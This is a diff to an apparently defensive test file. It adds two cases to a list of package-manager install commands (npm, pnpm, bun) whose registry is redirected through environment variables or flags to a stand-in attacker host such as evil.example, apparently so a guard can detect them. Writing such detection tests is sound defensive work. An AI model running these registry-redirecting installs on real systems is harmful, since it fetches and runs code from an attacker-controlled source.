@@ -93,6 +93,8 @@ describe('a package manager that takes the guard package from somewhere else is 
     'pnpm --registry https://evil.example add left-pad',
     'BUN_CONFIG_REGISTRY=https://evil.example bun install',
     'BUN_CONFIG_REGISTRY+=https://evil.example bun install',
+    'BUN_CONFIG_REGISTRY+=http://evil bun install',
+    'npm_config_registry+=http://evil npm install',
     'npm_config_registry+=https://evil.example npm install',
     'npm_config_registry=https://evil.example npm install',
     'NPM_CONFIG_REGISTRY=https://evil.example pnpm install',
